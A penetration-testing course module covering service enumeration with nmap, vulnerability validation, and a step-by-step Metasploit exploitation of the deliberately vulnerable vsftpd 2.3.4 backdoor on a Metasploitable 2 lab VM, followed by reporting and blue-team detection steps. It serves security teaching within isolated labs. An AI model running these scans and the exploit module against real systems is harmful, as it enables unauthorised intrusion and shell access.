# 07 — Protocol Exploitation: Enumeration, Vulnerability Validation, and Exploit Path Analysis

## Concept first: services are a surface area, not a single target

Every open port is a potential trust boundary. A vulnerable service is not necessarily exploitable in every environment, but it is a piece of evidence that something is outdated, misconfigured, or exposed beyond its required function.

### Offensive angle

The attacker enumerates services, identifies versions, matches them to known vulnerability data, and validates only the exact conditions required for exploitation. The difference between a scanner result and a successful exploit is important: a vulnerability is only meaningful if the preconditions are met and the impact is provable.

### Defensive angle

The defender reduces risk by limiting exposure, patching vulnerable versions, auditing service configuration, and checking whether the service actually needs to be reachable. Detection and logging are equally important because exploitation often leaves the same signatures: unexpected child processes, new listeners, or abnormal network connections.

### Commands explained

- `nmap -p-` and `nmap -sV`: identify open ports and exposed versions.
- `msfconsole` and `search`/`info`: map service versions to known exploit modules.
- `check`: validate whether the target is actually vulnerable before running a module.
- `journalctl`, `ss -ant`, `ps aux`: examine system evidence after a compromise.

This module teaches the difference between an unpatched service, a validated vulnerability, and a successful exploit path.

# Read this before touching the lab

Everything in this course is meant for machines you own and a network you deliberately isolated for testing.

Use a Host-Only/Internal network. A simple setup is:

- Kali: `192.168.56.10`
- Target: `192.168.56.20`
- Router: `192.168.56.1`
- Server/DNS/DHCP: `192.168.56.30`

Take VM snapshots before vulnerable configurations.

For attack exercises, replace placeholders such as `<TARGET>` with a lab IP. Do not replace them with a public IP, home router, college network, office network, or someone else's machine.

The point of the lab is not to collect a pile of payloads. For every technique, answer four questions:

1. What is happening on the wire?
2. Why does the target accept it?
3. What evidence would a defender see?
4. What change makes the attack fail?

## Start with exposure

Against your disposable target:

```bash
nmap -p- <TARGET>
nmap -sV <TARGET>
```

Then make a service table:

```text
Port | Service | Version | Why exposed? | Next check
```

Do not assume that an old version is automatically exploitable. Verify the exact version, configuration and vulnerability conditions.

## Metasploitable-style lab

A deliberately vulnerable VM such as Metasploitable 2 is useful because it contains old services specifically for training.

Example reconnaissance:

```bash
nmap -sV <TARGET>
```

If your target exposes a deliberately vulnerable FTP service, research the exact version first.

For a controlled Metasploitable 2 lab, one classic example is the intentionally vulnerable `vsftpd 2.3.4` service.

Start Metasploit:

```bash
msfconsole
```

Search:

```text
search vsftpd 2.3.4
```

Inspect the module:

```text
info exploit/unix/ftp/vsftpd_234_backdoor
```

Use it only against the lab target:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <TARGET>
set RPORT 21
check
run
```

If the lab target is vulnerable, the module may provide a shell. Do not skip the `info` and `check` stages just because a tutorial tells you a module exists.

## Once you have a lab shell

First establish what you actually got:

```bash
whoami
id
hostname
uname -a
pwd
```

Then stop. Do not immediately start deleting files or modifying the machine.

Your first job is to document the security impact.

## Why this is a real finding

A good write-up contains:

```text
Service:
Version:
Vulnerability:
Preconditions:
Proof:
Privilege level:
Potential impact:
Detection:
Patch/mitigation:
Retest:
```

## Safe vulnerability scanning

Nmap has NSE scripts:

```bash
nmap --script safe <TARGET>
```

For a deliberately vulnerable lab you can also study:

```bash
nmap --script vuln <TARGET>
```

Treat automated results as leads. Validate manually.

## Component vulnerability exercise

Pick one exposed service from your target.

1. Find its version.
2. Search the vendor advisory/CVE database.
3. Determine whether the exact build is affected.
4. Reproduce the issue on the vulnerable snapshot.
5. Patch or disable the service.
6. Run the same check again.

## Blue-team angle

On the target:

```bash
journalctl --since "30 minutes ago"
ss -ant
ps aux
```

Find evidence of the exploit connection.

If a service is compromised, identify:

- source IP
- destination port
- process
- user context
- child process
- filesystem changes
- outbound connections

## Important distinction

A scanner saying "vulnerable" is not the same as successful exploitation.

A successful exploit is not the same as root.

Root is not the same as domain or network-wide compromise.

Keep these levels separate in your reports.
